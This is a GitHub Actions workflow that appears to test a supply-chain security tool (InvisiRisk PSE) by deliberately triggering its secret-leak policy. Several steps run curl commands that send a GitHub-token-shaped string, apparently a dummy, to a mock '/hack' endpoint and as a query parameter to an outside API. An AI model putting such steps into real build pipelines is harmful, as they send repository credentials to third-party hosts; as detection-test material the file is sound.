name: FE build

on:
  workflow_dispatch:

permissions:
  checks: write
  contents: write
  packages: read

jobs:
  python-application-build:
    runs-on: ubuntu-latest
    name: Run build with anomalies

    steps:
      - name: Setup PSE
        continue-on-error: true
        uses: invisirisk/pse-action@latest
        with:
          api_url: "https://app.invisirisk.com"
          app_token: ${{ secrets.IR_TEST }}

      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Use Python
        uses: actions/setup-python@v4
        with:
          python-version: "3.13"

      - name: Use Node.js
        uses: actions/setup-node@v3
        with:
          node-version: "22.11.0"
      - name: Secret Leak Policy - request body
        continue-on-error: true
        run: |
          curl -k -X PUSH "https://vbirmock.free.beeceptor.com/hack" \
            -H "Content-Type: application/json" \
            -d '{
              "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
            }'

      - name: Secret Leak Policy - query parameter
        continue-on-error: true
        run: >-
          curl
          "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"

      - name: Secret Leak Policy - masked query parameter
        continue-on-error: true
        run: >-
          curl
          "https://api.veribom.com/graphql?GH=ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"


      - name: Install project dependencies
        run: pip install -r requirements.txt
